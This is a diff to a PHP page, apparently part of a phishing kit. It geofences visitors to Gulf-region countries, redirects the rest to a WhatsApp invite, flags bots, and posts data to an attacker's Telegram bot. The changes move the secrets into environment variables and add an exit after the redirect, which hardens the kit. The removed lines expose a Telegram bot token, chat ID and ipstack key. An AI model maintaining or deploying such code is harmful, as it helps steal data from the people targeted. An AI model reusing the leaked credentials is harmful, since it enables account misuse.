@@ -23,18 +23,28 @@ function get_ip_server()
 }
 
 $ip = get_ip_server();
-$access_key = 'cf4193at8h68ef4264487612f188c88e';
+$access_key = getenv('IPSTACK_ACCESS_KEY') ?: '';
 
-// Initialize CURL:
-$ch = curl_init('https://api.ipstack.com/' . $ip . '?access_key=' . $access_key . '');
-curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+if (empty($access_key)) {
+    error_log('done.php missing IPSTACK_ACCESS_KEY');
+    $api_result = ['country_code' => 'SA'];
+} else {
+    // Initialize CURL:
+    $ch = curl_init('https://api.ipstack.com/' . $ip . '?access_key=' . $access_key . '');
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 
-// Store the data:
-$json = curl_exec($ch);
-curl_close($ch);
+    // Store the data:
+    $json = curl_exec($ch);
+    curl_close($ch);
 
-// Decode JSON response:
-$api_result = json_decode($json, true);
+    // Decode JSON response:
+    $api_result = json_decode($json, true);
+    if (!is_array($api_result)) {
+        $api_result = ['country_code' => 'SA'];
+    } elseif (!isset($api_result['country_code'])) {
+        $api_result['country_code'] = 'SA';
+    }
+}
 
 $allowedCountries = ['SA', 'OM', 'BH', 'KW', 'QA', 'AE', 'JO','MA'];
 $redirectUrl = 'https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=ar';
@@ -45,12 +55,13 @@ if (in_array($api_result['country_code'], $allowedCountries)) {
     $nobots = 1;
 } else {
     header('Location: ' . $redirectUrl);
+    exit;
 }
 
 
-$telegramToken = "8142876449:AAFZ5zO987ZaHxpi_2cGYKXZsU4iV55O5Ck";
+$telegramToken = getenv('TELEGRAM_BOT_TOKEN') ?: '';
 $apiUrl = "https://api.telegram.org/bot" . $telegramToken;
-$chatId = "8015711971";
+$chatId = getenv('TELEGRAM_CHAT_ID') ?: '';
 
 
 
@@ -84,10 +95,9 @@ curl_setopt($sender, CURLOPT_SSL_VERIFYPEER, false);
 $result = curl_exec($sender);
 curl_close($sender);
 
-$telegramToken = "8142876449:AAFZ5zO987ZaHxpi_2cGYKXZsU4iV55O5Ck";
+$telegramToken = getenv('TELEGRAM_BOT_TOKEN') ?: '';
 $apiUrl = "https://api.telegram.org/bot" . $telegramToken;
-$chatId = "8015711971";
-
+$chatId = getenv('TELEGRAM_CHAT_ID') ?: '';
 
 $messageText = "#nihayat_LHikaya#";
 $encodedMsg = urlencode($messageText);
